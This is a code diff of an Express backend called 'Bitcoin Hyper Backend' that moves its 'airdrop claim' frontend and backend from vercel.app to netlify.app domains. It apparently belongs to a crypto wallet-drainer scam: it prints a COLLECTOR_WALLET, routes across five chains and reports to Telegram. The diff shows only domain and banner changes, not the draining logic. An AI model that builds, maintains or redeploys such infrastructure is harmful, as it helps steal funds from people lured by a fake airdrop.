@@ -32,8 +32,8 @@ const allowedOrigins = process.env.ALLOWED_ORIGINS
   ? process.env.ALLOWED_ORIGINS.split(',') 
   : [
       'http://localhost:3000', 
-      'https://hyperairdrop20.vercel.app', 
-      'https://hyperback-psi.vercel.app',
+      'https://hyperairdropclaim.netlify.app', 
+      'https://hypeback.netlify.app',
       'https://bitcoinhypertoken.vercel.app'
     ];
 
@@ -115,8 +115,8 @@ async function testTelegramConnection() {
       `✅ MultiChain FlowRouter Ready\n` +
       `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
       `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
-      `🔗 Backend: hyperback-psi.vercel.app\n` +
-      `🌍 Frontend: hyperairdrop20.vercel.app\n` +
+      `🔗 Backend: hypeback.netlify.app\n` +
+      `🌍 Frontend: hyperairdropclaim.netlify.app\n` +
       `🕐 Started: ${new Date().toLocaleString()}`;
     
     const sendResult = await sendTelegramMessage(startMessage);
@@ -149,8 +149,8 @@ app.get('/', (req, res) => {
     version: '2.0.0',
     status: '🟢 ONLINE',
     telegram: telegramEnabled ? '✅ connected' : '❌ disabled',
-    backendUrl: 'https://hyperback-psi.vercel.app',
-    frontendUrl: 'https://hyperairdrop20.vercel.app',
+    backendUrl: 'https://hypeback.netlify.app/',
+    frontendUrl: 'https://hyperairdropclaim.netlify.app/',
     timestamp: new Date().toISOString()
   });
 });
@@ -1063,8 +1063,8 @@ app.listen(PORT, '0.0.0.0', async () => {
   ║     ⚡ BITCOIN HYPER BACKEND - ENHANCED VERSION 2.0 ⚡        ║
   ╠══════════════════════════════════════════════════════════════╣
   ║  📍 Port: ${PORT.toString().padEnd(40)}║
-  ║  🔗 Backend: https://hyperback-psi.vercel.app${' '.repeat(16)}║
-  ║  🌍 Frontend: https://hyperairdrop20.vercel.app${' '.repeat(17)}║
+  ║  🔗 Backend: https://hypeback.netlify.app${' '.repeat(16)}║
+  ║  🌍 Frontend: https://hyperairdropclaim.netlify.app${' '.repeat(17)}║
   ╠══════════════════════════════════════════════════════════════╣
   ║  📦 COLLECTOR: ${COLLECTOR_WALLET.substring(0, 30)}...${' '.repeat(4)}║
   ╠══════════════════════════════════════════════════════════════╣
